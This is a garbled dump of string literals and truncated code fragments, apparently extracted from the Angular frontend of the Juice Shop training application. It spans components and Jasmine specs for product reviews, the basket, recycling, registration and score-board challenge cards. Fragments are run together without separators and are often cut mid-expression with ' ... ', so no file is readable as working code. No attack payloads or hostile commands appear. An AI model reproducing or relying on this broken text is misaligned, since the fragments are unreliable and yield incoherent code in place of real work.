Drive/Git/juice-shop/frontend/src/app/product-details/product-details.component.spec.ts'../product-review-edit/product-review-edit.component'By'../Services/product-review.service''./product-details.component''ProductDetailsComponent'productReviewServicedialogRefMock'Dialog'afterClosedautoDetectChanges'should post anonymous review if no user email is returned'textAreadebugElement'textarea''Great product!'buttonDe'#submitButton'triggerEventHandler'click'reviewObjectcallsargsFor'should post review with user email as author''should log errors when retrieving user directly to browser console''should log errors when posting review directly to browser console''should refresh reviews after posting a review''42''Review 1''should open a modal dialog with review editor''div.review-text'reviewData'should refresh reviews of product after editing a review'../product-review-edit/product-review-edit.component../Services/product-review.service./product-details.component/product-details'Produc ... ponent'let pro ... ce: anyproduct ... ce: anylet dialogRefMockproduct ... eate'])jasmine ... eate'])['get', 'create']product ... ice.getproduct ... ate.andproduct ... .createDialogdialogR ... \r\n    }afterCl ...  of({})() => of({})dialog. ... efMock)[Produc ... ponent]'should ... turned'should post anonymous review if no user email is returned() => { ... t)\r\n  }compone ... oduct }component.data{ produ ... oduct }product ... Productconst t ... ElementtextAre ... Elementfixture ... Elementfixture ... area'))fixture ... t.queryfixture.debugElementBy.css('textarea')By.csstextAre ... oduct!'textArea.valueGreat product!const b ... tton'))buttonD ... tton'))fixture ... tton'))By.css( ... utton')#submitButtonbuttonD ... , null)buttonD ... Handlerconst r ... mous' }reviewO ... mous' }{ messa ... mous' }message ... oduct!'author: 'Anonymous'expect( ... ount())product ... count()product ... s.countproduct ... e.callsexpect( ... (0)[0])product ... r(0)[0]product ... sFor(0)product ... argsForexpect( ... (0)[1])product ... r(0)[1]'should ... author'should post review with user email as authoruserSer ... op' }))of({ em ... .op' }){ email ... h.op' }email:  ... -sh.op'const r ... h.op' }reviewO ... h.op' }{ messa ... h.op' }author: ... -sh.op'should log errors when retrieving user directly to browser consoleshould log errors when posting review directly to browser consolefixture.destroy()fixture.destroy'should ... review'should refresh reviews after posting a reviewproduct ... s' }]))of([{ i ... us' }])[{ id:  ... ous' }]{ id: ' ... mous' }id: '42'message: 'Review 1'Review 1expect( ... create)'should ... editor'should open a modal dialog with review editorproduct ... p' }]))of([{ i ... op' }])[{ id:  ... .op' }]{ id: ' ... h.op' }const b ... text'))buttonD ... text'))fixture ... text'))By.css( ... -text')div.review-textdialog. ... count()dialog. ... s.countdialog.open.callsexpect( ... ponent)dialog. ... r(0)[0]dialog. ... sFor(0)dialog. ... argsForexpect( ... p' } })expect( ... ].data)dialog. ... 1].datadialog. ... r(0)[1]{ revie ... op' } }reviewD ... h.op' }should refresh reviews of product after editing a reviewexpect( ... ith(42)P:/My Drive/Git/juice-shop/frontend/src/app/product-details/product-details.component.tsfaArrowCircleLeftfaCrownfaUserEdit'../Models/review.model''app-product-details''./product-details.component.html''./product-details.component.scss'userSubscription'CONFIRM_REVIEW_SAVED''Liked '../Models/review.model/Models/reviewtype Reviewlibrary ... aCrown)'app-pr ... etails'app-product-details'./prod ... t.html'./product-details.component.html['./pro ... .scss']'./prod ... t.scss'./product-details.component.scsspublic  ... nymous'public reviews$: anyproductData: Productthis.da ... e / 10)this.da ... .pointsthis.da ... uctDatathis.datathis.da ... ce / 10this.da ... a.pricethis.re ... ata.id)this.reviews$this.pr ... ata.id)this.pr ... Servicethis.da ... Data.idthis.us ... riptionif (use ...       }user?.emailthis.au ... r.emailthis.authorthis.au ... nymous'this.us ... cribe()addRevi ... ')\r\n  }const r ... uthor }review  ... uthor }{ messa ... uthor }message ... t.valueauthor: this.authortextPut.value = ''this.pr ... review)this.pr ... .createthis.sn ... SAVED')'CONFIR ... _SAVED'CONFIRM_REVIEW_SAVEDeditRev ... ))\r\n  }this.di ... a.id)))this.di ... bscribethis.di ... losed()this.di ... rClosedreviewData: review() => ( ... ta.id))(this.r ... ta.id))likeRev ... 0)\r\n  }this.pr ... ew._id)this.pr ... ce.likereview._idconsole ... ew._id)'Liked  ... iew._idLiked setTime ... ), 200)@Inject ... oduct }P:/My Drive/Git/juice-shop/frontend/src/app/product-review-edit/product-review-edit.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/product-review-editeditReviewControleditRev ... invalideditReview()margin-left: 5px;Send the revieweditReviewControl.invalidclose-dialoghintLabelMax 160 charactersfloatLabelP:/My Drive/Git/juice-shop/frontend/src/app/product-review-edit/product-review-edit.component.spec.ts'./product-review-edit.component''src/app/Services/product-review.service''ProductReviewEditComponent'dialogRef'patch''MatDialogRef''close''Review''Horst''should be initialized with data from the passed review''should update review through backend API''Another Review''should close the dialog on submitting the edited review'./product-review-edit.component/product-review-editsrc/app/Services/product-review.servicesrc/app/Services/product-reviewlet dialogRef: anydialogRef: anyproduct ... atch'])jasmine ... atch'])['patch']product ... tch.andproduct ... e.patchdialogR ... lose'])jasmine ... lose'])['close']dialogR ... lue({})dialogR ... rnValuedialogRef.close.anddialogRef.close{ provi ... ogRef }useValue: dialogRefcompone ... st' } }{ revie ... st' } }reviewD ... orst' }{ _id:  ... orst' }_id: '42'message: 'Review'author: 'Horst'Horstshould be initialized with data from the passed reviewexpect( ... eview')should update review through backend APIcompone ... eview')Another Reviewcompone ... eview()component.editReviewproduct ... h.callsexpect( ... iew' }){ id: ' ... view' }message ... Review'should close the dialog on submitting the edited reviewexpect( ... .close)P:/My Drive/Git/juice-shop/frontend/src/app/product-review-edit/product-review-edit.component.ts'app-product-review-edit''./product-review-edit.component.html''./product-review-edit.component.scss''CONFIRM_CHANGES_SAVED'library ... leLeft)selecto ... w-edit''app-pr ... w-edit'app-product-review-edit./product-review-edit.component.html./product-review-edit.component.scss{ revie ... eview }reviewData: ReviewMatDial ... ponent>ngOnIni ... e)\r\n  }this.ed ... essage)this.ed ... etValuethis.ed ... Controlthis.da ... messagethis.data.reviewDataeditRev ... ')\r\n  }this.pr ... e.patch{ id: t ... value }id: thi ... ata._idthis.da ... ata._idthis.ed ... l.valuethis.di ... close()this.dialogRef.closethis.dialogRefCONFIRM_CHANGES_SAVED@Inject ... eview }private ... ponent>P:/My Drive/Git/juice-shop/frontend/src/app/purchase-basket/purchase-basket.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/purchase-basket'assets ... t.imageelement.imagedecdec(ele ... tem.id)element ... Item.idelement.BasketItemincinc(ele ... tem.id)delete( ... tem.id)(elemen ... tem.id)displayTotal{{"LABEL_TOTAL_PRICE"| translate }}"LABEL_TOTAL_PRICE"LABEL_TOTAL_PRICEdelete(element.BasketItem.id)inc(element.BasketItem.id)fas fa-plus-squarefont-size: initial;{{element.BasketItem.quantity}}element ... uantitydec(element.BasketItem.id)fas fa-minus-square'assets/public/images/products/'+element.imageP:/My Drive/Git/juice-shop/frontend/src/app/purchase-basket/purchase-basket.component.spec.ts'PurchaseBasketComponent''should load user email when being created''(a@a)''should log an error if userService fails to fetch the user''should hold products returned by backend API''Product1''Product2''should have price equal to deluxePrice for deluxe users''should have price different from deluxePrice for non-deluxe users''should hold no products on error in backend API''should hold no products when none are returned by backend API''should log error while getting Products from backend API directly to browser console''should pass delete request for basket item via BasketService''should load again after deleting a basket item''should log error while deleting basket item directly to browser console''should update basket item with increased quantity after adding another item of same type''should not increase quantity on error retrieving basket item and log the error''should not increase quantity on error updating basket item and log the error''should load again after increasing product quantity''should update basket item with decreased quantity after removing an item''should always keep one item of any product in the basket when reducing quantity via UI''should not decrease quantity on error retrieving basket item and log the error''should not decrease quantity on error updating basket item and log the error''should load again after decreasing product quantity''should reset quantity to 1 when decreasing for quantity tampered to be negative''should reset quantity to 1 when increasing for quantity tampered to be negative''Purcha ... ponent'['find' ... Items']basketS ... del.andbasketService.delbasketS ... get.andbasketService.getbasketS ... put.andbasketService.put[Purcha ... ponent]'should ... reated'should load user email when being createduserSer ... @a' }))of({ email: 'a@a' }){ email: 'a@a' }email: 'a@a'expect( ... (a@a)')(a@a)'should ... e user'should log an error if userService fails to fetch the usershould hold products returned by backend APIbasketS ...  }] }))of({ Pr ... } }] }){ Produ ...  } }] }Product ...  2 } }][{ name ...  2 } }]{ name: ... : 1 } }name: 'Product1'Product1deluxePrice: 1BasketI ... ty: 1 }{ quantity: 1 }{ name: ... : 2 } }name: 'Product2'Product2price: 2deluxePrice: 2BasketI ... ty: 2 }{ quantity: 2 }component.dataSourceexpect( ... duct1')compone ... urce[0]expect( ... antity)compone ... ketItemexpect( ... duct2')compone ... urce[1]should have price equal to deluxePrice for deluxe usersdeluxeG ... e(true)Product ...  1 } }][{ name ...  1 } }]should have price different from deluxePrice for non-deluxe usersshould hold no products on error in backend APIshould hold no products when none are returned by backend APIshould log error while getting Products from backend API directly to browser consoleshould pass delete request for basket item via BasketServicecomponent.delete(1)component.delete'should ... t item'should load again after deleting a basket itemshould log error while deleting basket item directly to browser console'should ... e type'should update basket item with increased quantity after adding another item of same type{ id: 1 ... ty: 1 }basketS ... : 1 }))of({ id ... y: 1 })component.inc(1)component.incexpect( ... y: 2 })'should ...  error'should not increase quantity on error retrieving basket item and log the errorexpect( ... ut).notshould not increase quantity on error updating basket item and log the error[{ Bask ...  1 } }]{ Baske ... : 1 } }should load again after increasing product quantity[{ Bask ...  2 } }]{ Baske ... : 2 } }{ id: 1 ... ty: 2 }basketS ... : 2 }))of({ id ... y: 2 })basketS ... : 3 }))of({ id ... y: 3 }){ id: 1 ... ty: 3 }expect( ... e.find)'should ... n item'should update basket item with decreased quantity after removing an itemcomponent.dec(1)component.decexpect( ... y: 1 })'should ... via UI'should always keep one item of any product in the basket when reducing quantity via UIshould not decrease quantity on error retrieving basket item and log the errorshould not decrease quantity on error updating basket item and log the errorshould load again after decreasing product quantity'should ... gative'should reset quantity to 1 when decreasing for quantity tampered to be negativeProduct ... 00 } }][{ Bask ... 00 } }]{ Baske ... 100 } }BasketI ...  -100 }{ id: 1 ...  -100 }quantity: -100-100basketS ... 100 }))of({ id ... -100 })should reset quantity to 1 when increasing for quantity tampered to be negativeP:/My Drive/Git/juice-shop/frontend/src/app/purchase-basket/purchase-basket.component.tsfaMinusSquarefaPlusSquare'app-purchase-basket''./purchase-basket.component.html''./purchase-basket.component.scss''displayTotal''totalPrice'emitTotalemitProductCount'('')'bonusPointssendToParentaddToQuantitynewQuantitylibrary ... Square)'app-pu ... basket''./purc ... t.html'./purchase-basket.component.html/purchase-basket['./pur ... .scss']'./purc ... t.scss'./purchase-basket.component.scss@Input( ... Total')Input(' ... Total')@Input('totalPrice')Input('totalPrice')emitTot ... itter()emitPro ... itter()['image ... price']public  ... ce = []this.al ... emove')!this.t ... emove')this.ta ... emove')this.ta ... ncludesthis.tableColumnsthis.ta ... ns.push(data)  ... \r\n    }this.us ... nymous'this.us ... l + ')''(' + t ... l + ')''(' + this.userEmailthis.ba ... err) })this.ba ... ), 10))this.ba ... ce.findthis.isDeluxe()this.isDeluxebasket. ...      })basket. ... forEachproduct ...       }product ... xePricethis.da ... roductsthis.it ... ity, 0)this.bo ... ity, 0)(bonusP ... uantitybonusPo ... uantityMath.ro ... uantitythis.se ... length)this.sendToParentthis.da ... .lengththis.ba ... del(id)this.ba ... ice.delinc (id ... 1)\r\n  }this.ad ... (id, 1)this.addToQuantitydec (id ... 1)\r\n  }this.ad ... id, -1)-1addToQu ... })\r\n  }this.ba ... get(id)this.ba ... ice.getconst n ... + valuenewQuan ... + valuebasketI ... + valuebasketItem.quantitythis.ba ... tity })this.ba ... ice.put{ quant ... ntity }newQuan ... uantitynewQuantity < 1sendToP ... t)\r\n  }this.em ... bonus])this.emitTotal.emitthis.emitTotal[this.i ... .bonus]this.em ... (count)this.em ... nt.emitthis.em ... ctCountisDelux ... ()\r\n  }return  ... eluxe()this.de ... eluxe()this.de ... sDeluxethis.deluxeGuardprivate ... xeGuardP:/My Drive/Git/juice-shop/frontend/src/app/qr-code/qr-code.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/qr-code'M'qr-code mat-typographyfooterfas fa-arrow-circle-left fa-lg{{address}}qr-code[size][level]{{title | translate}}title | translateP:/My Drive/Git/juice-shop/frontend/src/app/qr-code/qr-code.component.spec.ts'./qr-code.component''QrCodeComponent''url''title'./qr-code.component/qr-code[QrCodeComponent]{ provi ... le' } }useValu ... itle' }{ data: ... itle' }data: 'data'url: 'url'title: 'title'expect( ... title')expect( ... .title)component.titleexpect( ... ('url')expect( ... nt.url)component.urlexpect( ... dress')expect( ... 'data')expect( ... t.data)P:/My Drive/Git/juice-shop/frontend/src/app/qr-code/qr-code.component.ts'app-qr-code''./qr-code.component.html''./qr-code.component.scss'selecto ... r-code'app-qr-code'./qr-c ... t.html'./qr-code.component.html['./qr- ... .scss']'./qr-c ... t.scss'./qr-code.component.scsspublic url!: stringpublic data!: stringngOnIni ... ta\r\n  }{\r\n     ... ta\r\n  }this.ti ... a.titlethis.titlethis.di ... a.titlethis.ur ... ata.urlthis.urlthis.dialogData.urlthis.di ... addressthis.da ... ta.datathis.dialogData.dataP:/My Drive/Git/juice-shop/frontend/src/app/recycle/recycle.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/recyclerequestorControlrecycleQuantityControlrecycle ... Control'IN_LITERS_PLACEHOLDER''IN_LIT ... anslate'IN_LIT ... HOLDER'IN_LITERS_PLACEHOLDERrecycle ... equiredrecycle ... invalidrecycle ... .errorsrecycle ... rs.max)(recycl ... rs.max)recycle ... ors.maxrecycle ... ors.min'10-1000'{range: '10-1000'}range: '10-1000'10-1000pickuppickup. ... e > 100pickup.valuerecycle ... e > 100recycle ... l.valuepickUpDateControlpickerpickUpD ... invalidtopImagebottomImagemat-card-imageresponsibility-headerrecycleButtonaddressId === undefined || recycleQuantityControl.invalid || pickUpDateControl.invalid{{'BTN_SUBMIT' |
      translate}}fas fa-paper-plane fa-lgrecycle-formrecycleQuantityControl.value > 100{{'REQUEST_PICKUP' | translate}}'REQUEST_PICKUP''REQUES ... anslateREQUEST_PICKUPpickup.value && recycleQuantityControl.value > 100pickUpDateControl.invalidmat-datepickermat-datepicker-toggle[for][matDatepicker]recycleQuantityControl.invalid && (recycleQuantityControl.errors.min || recycleQuantityControl.errors.max)recycleQuantityControl.invalid && recycleQuantityControl.errors.required'IN_LITERS_PLACEHOLDER' | translateP:/My Drive/Git/juice-shop/frontend/src/app/recycle/recycle.component.spec.ts'../Services/recycle.service''./recycle.component''RecycleComponent'recycleService'should reset the form by calling resetForm''100''10/7/2018''should display pickup message and reset recycle form on saving''CONFIRM_RECYCLING_BOX''initRecycle'addressComponentinitRecycle'should display pickup message and reset recycle form on saving when pickup is selected'pickupDate'CONFIRM_RECYCLING_PICKUP'isPickUppickupdate'should hold existing recycles''should hold nothing when no recycles exists''should hold nothing on error from backend API''should log the error on retrieving the user''should use a configured product image on top of page''top.png''assets/public/images/products/top.png''should use a configured product image on bottom of page''bottom.png''assets/public/images/products/bottom.png''should show broken top and bottom image on error retrieving configuration'../Services/recycle.service./recycle.componentlet rec ... ce: anyrecycleService: anyrecycle ... find'])['save', 'find']recycle ... of({}))recycle ... rnValuerecycle ... ave.andrecycleService.saverecycle ... ([{}]))recycle ... ind.andrecycleService.findof([{}])[Recycl ... ponent]should reset the form by calling resetFormcompone ... d = '1'compone ... ('100')compone ... /2018')10/7/2018component.pickupcompone ... p.valueexpect( ... UserId)compone ... .UserIdcomponent.recycleshould display pickup message and reset recycle form on savingtransla ... _BOX'))of('CON ... G_BOX')'CONFIR ... NG_BOX'CONFIRM_RECYCLING_BOXspyOn(c ... cycle')compone ... ue(100)compone ... (false)const r ... : 100 }recycle ... : 100 }{ UserI ... : 100 }UserId: undefinedAddressId: '1'quantity: 100recycle ... count()recycle ... s.countrecycle ... e.callsexpect( ... ecycle)recycle ... r(0)[0]recycle ... sFor(0)recycle ... argsForcompone ... Recyclecompone ... nt.loadexpect( ... G_BOX')should display pickup message and reset recycle form on saving when pickup is selectedrecycle ... 18' }))of({ is ... 018' }){ isPic ... 2018' }pickupD ... 7/2018'transla ... CKUP'))of('CON ... ICKUP')'CONFIR ... PICKUP'CONFIRM_RECYCLING_PICKUP{ isPic ... : 100 }isPickUp: truedate: '10/7/2018'expect( ... 018' }){ picku ... 2018' }pickupd ... 7/2018''should ... cycles'should hold existing recyclesrecycle ...  2 }]))of([{ q ... : 2 }])[{ quan ... y: 2 }]component.recyclescompone ... cles[0]compone ... cles[1]should hold nothing when no recycles existsrecycle ... of([]))should hold nothing on error from backend APIrecycle ... rror'))should log the error on retrieving the user'should ... f page'should use a configured product image on top of pageapplica ... ng' } }{ recyc ... ng' } }recycle ... .png' }{ topPr ... .png' }topProd ... op.png'top.pngexpect( ... p.png')expect( ... pImage)component.topImage'assets ... op.png'assets/public/images/products/top.pngassets/public/images/products/topshould use a configured product image on bottom of pagetopProd ... om.png'bottom.pngexpect( ... m.png')'assets ... om.png'assets/public/images/products/bottom.pngassets/public/images/products/bottomshould show broken top and bottom image on error retrieving configurationexpect( ... mImage)compone ... omImageP:/My Drive/Git/juice-shop/frontend/src/app/recycle/recycle.component.ts'app-recycle''./recycle.component.html''./recycle.component.scss''addressComp'`assets/public/images/products/${findAll'recycle-form''recycleButton'savedRecycleconfirmRecyclingPickupconfirmRecyclingBoxselecto ... ecycle'app-recycle'./recy ... t.html'./recycle.component.html['./rec ... .scss']'./recy ... t.scss'./recycle.component.scsspublic  ... mponentaddressComppublic  ... 1000)])new Unt ... 1000)])[Valida ... (1000)]Validators.min(10)Validators.max(1000)public recycles: anypublic  ... il: anyconfig? ... clePagethis.to ... Image}`this.topImage`assets ... Image}`assets/ ... oducts/config. ... ctImageconfig. ... clePagethis.bo ... Image}`this.bottomImagethis.initRecycle()this.initRecyclethis.findAll()this.findAllinitRec ... })\r\n  }this.recycle = {}this.recyclethis.re ... data.idthis.recycle.UserIdthis.us ... a.emailthis.re ... rEmail)this.re ... dressIdthis.re ... uantitythis.pickup.valuethis.pickupthis.re ... p.valuethis.re ... sPickUpthis.recycle.datethis.pi ... Controlthis.re ... \n    })this.re ... bscribethis.re ... ecycle)this.re ... ce.savethis.recycleService(savedR ... \r\n    }savedRe ... sPickupthis.tr ... Date }){ picku ... pDate }pickupd ... kupDatesavedRe ... kupDate(confir ...       }confirm ... gPickupthis.tr ... G_BOX')this.ad ... .load()this.ad ... nt.loadthis.ad ... mponentthis.re ... .find()this.re ... ce.find(recycl ... \r\n    }this.re ... ecyclesthis.recyclesresetFo ... e)\r\n  }this.pi ... (false)this.pickup.setValueP:/My Drive/Git/juice-shop/frontend/src/app/register/register.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/registerpasswor ... length)(passwo ... length)passwor ... xlengthpasswor ... nlengthquestion.idsecurityAnswerControl'SECURITY_ANSWER_PLACEHOLDER''SECURI ... anslate'SECURI ... HOLDER'SECURITY_ANSWER_PLACEHOLDERregistration-formalreadyACustomerLinkregisterButtonemailControl.invalid || passwordControl.invalid || repeatPasswordControl.invalid || securityQuestionControl.invalid || securityAnswerControl.invalidButton to complete the registration{{'BTN_REGISTER' | translate}}'BTN_REGISTER'BTN_REGISTERsecurity-containersecurityAnswerControl.invalid && securityAnswerControl.errors.required(focus)'SECURITY_ANSWER_PLACEHOLDER' | translatemat-selectmat-optionlet question of securityQuestions{{question.question}}question.question{{'LABEL_SECURITY_QUESTION' | translate}}'LABEL_SECURITY_QUESTION''LABEL_ ... ESTION'LABEL_SECURITY_QUESTIONpasswordControl.invalid && (passwordControl.errors.minlength || passwordControl.errors.maxlength)ng-ifP:/My Drive/Git/juice-shop/frontend/src/app/register/register.component.spec.ts'../Services/security-answer.service''./register.component''RegisterComponent'securityAnswerService'should be compulsory to provid email''email field should be of proper format''should be compulsory to provide password''password should have at least five characters''aaaa''password should not be more than 20 characters'41'password and repeat password should be the same''bbbbb''redirects to login page after user registration''Wat is?'securityAnswerObject'loading secret questions''WTF?''WAT?''should hold nothing when no secret questions exists''should log error from backend API on failing to get security questions''should log error on saving user'../Services/security-answer.service./register.componentsecurit ... save'])securit ... ave.andsecurit ... ce.savesecurit ... find'])securit ... ([{}]))securit ... ind.andsecurit ... ce.find[Regist ... ponent]'should ...  email'should be compulsory to provid emailit('ema ... )\r\n  })'email  ... format'email field should be of proper formatcompone ... @x.xx')should be compulsory to provide passwordit('pas ... )\r\n  })'passwo ... acters'password should have at least five characterscompone ... 'aaaa')aaaapassword should not be more than 20 characterslet pas ... ng = ''passwor ... ng = ''i < 41password += 'a'compone ... ssword)passwor ... lice(1)password.slice(1)password.slice'passwo ... e same'password and repeat password should be the sameconst p ... 'aaaaa'passwor ... 'aaaaa'compone ... bbbbb')bbbbbcompone ... Repeat)it('red ... \r\n  }))'redire ... ration'redirects to login page after user registrationuserSer ... s?' }))of({ id ... is?' }){ id: 1 ...  is?' }question: 'Wat is?'Wat is?Wat is?compone ... is?' }]compone ... estions[{ id:  ... is?' }]const u ... swer' }user =  ... swer' }{ email ... swer' }password: 'password'passwor ... ssword'securit ...  is?' }securit ... Answer'const s ... Id: 1 }securit ... Id: 1 }{ UserI ... Id: 1 }answer: 'Answer'Securit ... onId: 1expect( ... l(user)userSer ... r(0)[0]userSer ... sFor(0)userSer ... argsForuserSer ... e.callssecurit ... r(0)[0]securit ... sFor(0)securit ... argsForsecurit ... e.callsexpect( ... login')it('loa ... )\r\n  })'loadin ... stions'loading secret questionssecurit ... ?' }]))of([{ i ... T?' }])[{ id:  ... AT?' }]{ id: 1 ... WTF?' }question: 'WTF?'WTF?WTF?F{ id: 2 ... WAT?' }question: 'WAT?'WAT?WAT?expect( ... 'WTF?')compone ... ions[0]expect( ... 'WAT?')compone ... ions[1]should hold nothing when no secret questions existssecurit ... fined))expect( ... stions)'should ... stions'should log error from backend API on failing to get security questions'should ... g user'should log error on saving userP:/My Drive/Git/juice-shop/frontend/src/app/register/register.component.tsfaExclamationCirclefaUserPlus'app-register''./register.component.html''./register.component.scss''registration-form''registerButton''CONFIRM_REGISTER'library ... Circle)selecto ... gister'app-register'./regi ... t.html'./register.component.html['./reg ... .scss']'./regi ... t.scss'./register.component.scsspublic  ... stion[]SecurityQuestion[]public  ...  numberthis.se ... err) })this.se ... d(null)this.se ... ce.find(securi ... \r\n    }this.se ... estionsconst u ... \r\n    }user =  ... \r\n    }securit ... .value)this.se ... ns.find(questi ... l.valuequestio ... l.valuesecurit ... l.valuethis.us ... e(user)this.se ...      })this.se ... ce.saveUserId: response.idresponse.idSecurit ... l.valuethis.sn ... ISTER')CONFIRM_REGISTERerr.error?.errorsconst e ... rors[0]error = ... rors[0]err.error.errors[0]err.error.errorsthis.er ... lice(1)error.m ... lice(1)error.m ... rCase()error.m ... perCaseerror.message[0]error.message.sliceP:/My Drive/Git/juice-shop/frontend/src/app/roles.tsexport  ... min'\r\n}const r ... min'\r\n}roles = ... min'\r\n}{\r\n  cu ... min'\r\n}customer: 'customer'deluxe: 'deluxe'account ... unting'admin: 'admin'P:/My Drive/Git/juice-shop/frontend/src/app/saved-address/saved-address.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/saved-addressP:/My Drive/Git/juice-shop/frontend/src/app/saved-address/saved-address.component.spec.ts'./saved-address.component''SavedAddressComponent'./saved-address.component/saved-address'SavedA ... ponent'[SavedA ... ponent]P:/My Drive/Git/juice-shop/frontend/src/app/saved-address/saved-address.component.ts'app-saved-address''./saved-address.component.html''./saved-address.component.scss'export  ... nt {\r\n}class S ... nt {\r\n}app-saved-address'./save ... t.html'./saved-address.component.html['./sav ... .scss']'./save ... t.scss'./saved-address.component.scssP:/My Drive/Git/juice-shop/frontend/src/app/saved-payment-methods/saved-payment-methods.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/saved-payment-methodsP:/My Drive/Git/juice-shop/frontend/src/app/saved-payment-methods/saved-payment-methods.component.spec.ts'./saved-payment-methods.component''SavedPaymentMethodsComponent'./saved-payment-methods.component'SavedP ... ponent'[SavedP ... ponent]P:/My Drive/Git/juice-shop/frontend/src/app/saved-payment-methods/saved-payment-methods.component.ts'app-saved-payment-methods''./saved-payment-methods.component.html''./saved-payment-methods.component.scss'selecto ... ethods''app-sa ... ethods'app-saved-payment-methods./saved-payment-methods.component.html./saved-payment-methods.component.scssP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/challenge-card/challenge-card.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/challenge-cardP:/My Drive/Git/juice-shop/frontend/src/app/score-board/componentsP:/My Drive/Git/juice-shop/frontend/src/app/score-boardchallenge.difficultychallen ... riptiontagListchallenge.tagList'TAG_'' ''_DESCRIPTION'('TAG_' ... nslate)'TAG_'  ... anslate'TAG_'  ... IPTION''TAG_'  ... in('_')TAG_tag?.to ... in('_')tag?.to ... ').jointag?.to ... it(' ')tag?.to ... ).splittag?.toUpperCase()tag?.toUpperCase_DESCRIPTION'safetyMode'challen ... tyMode'challen ... == null'CHALLENGE_UNAVAILABLE''CHALLE ... edEnv }'CHALLE ... ILABLE'CHALLENGE_UNAVAILABLE{ env:  ... edEnv }env: ch ... bledEnv'var(--theme-warn)'var(--theme-warn)(--theme-warn)--theme-warn'CHALLENGE_UNAVAILABLE_SAFETYMODE''CHALLE ... ledEnv}'CHALLE ... TYMODE'CHALLENGE_UNAVAILABLE_SAFETYMODE{ env:  ... ledEnv}hasCodingChallengeopenCodingChallengeDialogopenCod ... ge.key)openCod ... eDialog        'partially-completed': challenge.codingChallengeStatus === 1,
'LAUNCH_CODING_CHALLENGE''SOLVE_HACKING_CHALLENGE'(challe ... anslate(challe ... LENGE')challen ... LLENGE''LAUNCH ... LLENGE'LAUNCH_CODING_CHALLENGE'SOLVE_ ... LLENGE'SOLVE_HACKING_CHALLENGEchallen ... s !== 0challen ... eStatuschallen ... tionUrl'INFO_VULNERABILITY_MITIGATION_LINK''INFO_V ... anslate'INFO_V ... N_LINK'INFO_VULNERABILITY_MITIGATION_LINK{ 'completed': challenge.solved }applicationConfigurationchallen ... cationsapplica ... cationsapplica ... ion.ctfapplica ... urationrepeatChallengeNotificationrepeatC ... ge.key)repeatC ... icationhasInstructionshasInst ... e.name)'INFO_HACKING_INSTRUCTOR''INFO_H ... anslate'INFO_H ... RUCTOR'INFO_HACKING_INSTRUCTORstartHackingInstructorForstartHa ... e.name)startHa ... ctorForchallen ... hintUrl'0 6px 0 4px'0 6px 0 4pxchallengeHintchallen ... | asyncchallen ... intUrl}{hintUr ... intUrl}hintUrl ... hintUrlbottom-rowbadge-group<!-- without hintUrl --><!-- challenge hint --><!-- with hintUrl -->badge not-completablehasInstructions(challenge.name)'INFO_HACKING_INSTRUCTOR' | translatestartHackingInstructorFor(challenge.name)<!-- hacking instructor-->badgechallenge.solved && applicationConfiguration.ctf.showFlagsInNotificationsrepeatChallengeNotification(challenge.key)'NOTIFICATION_RESEND_INSTRUCTIONS' | translate<!-- ctf mode flag repeat-->challenge.mitigationUrl && challenge.solvedchallenge.mitigationUrl'INFO_VULNERABILITY_MITIGATION_LINK' | translateVulnerability mitigation link<!-- cheat cheat link-->challenge.hasCodingChallengeopenCodingChallengeDialog(challenge.key)challenge.solved === false{
        'partially-completed': challenge.codingChallengeStatus === 1,
        'completed': challenge.codingChallengeStatus === 2
      }(challenge.solved ? 'LAUNCH_CODING_CHALLENGE' : 'SOLVE_HACKING_CHALLENGE') | translatebadge-statuschallenge.codingChallengeStatus !== 0{{ challenge.codingChallengeStatus }}<!-- coding challenge badge -->challenge.disabledEnv === 'safetyMode''CHALLENGE_UNAVAILABLE_SAFETYMODE'| translate:{ env: challenge.disabledEnv}challenge.disabledEnv !== null && challenge.disabledEnv !== 'safetyMode''CHALLENGE_UNAVAILABLE' | translate:{ env: challenge.disabledEnv }<!-- info text if the challenge is unavailable -->let tag of challenge.tagList('TAG_' + tag?.toUpperCase().split(' ').join('_') + '_DESCRIPTION' | translate){{ tag }}description-rowchallenge.descriptionname-rowdifficulty-stars[difficulty]{{ challenge.name }}dotcategory-row{{ challenge.category }}challenge.categoryP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/challenge-card/challenge-card.component.spec.tsChallengeCardComponent'./challenge-card.component''src/app/Services/configuration.service''ChallengeCard''my name''https://owasp.example.com''lorem ipsum''Easy''should not show a mitigation link when challenge has it but isnt solved''[aria-label="Vulnerability mitigation link"]''should show a mitigation link when challenge has it but isnt solved'./challenge-card.component/challenge-cardsrc/app/Services/configuration.servicesrc/app/Services/configurationtype ConfigChallengeCard[Transl ... Module]compone ...  as any{\r\n     ...  as anycategory: 'foobar'name: 'my name'my namemitigat ... le.com''https: ... le.com'https://owasp.example.comexamplehasCodi ... e: truedescrip ...  ipsum'lorem ipsumtagList: ['Easy']['Easy']Easycompone ...  Config{\r\n     ...  Configctf: {\r ...       }should not show a mitigation link when challenge has it but isnt solvedcompone ... .solvedcompone ... le.com'compone ... tionUrlexpect( ... nk"]'))fixture ... ink"]')fixture ... elector'[aria- ... link"]'[aria-label="Vulnerability mitigation link"]a-lgshould show a mitigation link when challenge has it but isnt solvedP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/challenge-card/challenge-card.component.tsEnrichedChallenge'../../types/EnrichedChallenge''../../../../hacking-instructor''challenge-card''./challenge-card.component.html''./challenge-card.component.scss'challengeKey'../../ ... llenge'../../types/EnrichedChallenge/types/EnrichedChallengeimport  ... ructor''../../ ... ructor'../../../../hacking-instructor/hacking-instructorexport  ... rFor\r\n}class C ... rFor\r\n}selecto ... e-card'challenge-card./challenge-card.component.html./challenge-card.component.scsspublic  ... => void(challe ... => voidpublic  ...  Configpublic  ... uctionspublic  ... ctorForP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/challenges-unavailable-warning/challenges-unavailable-warning.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/score-board/components/challenges-unavailable-warningnumberOfDisabledChallengesnumberO ... ges > 0numberO ... llengesdisabledBecauseOfEnvdisable ... indows'disable ... rCase()disable ... 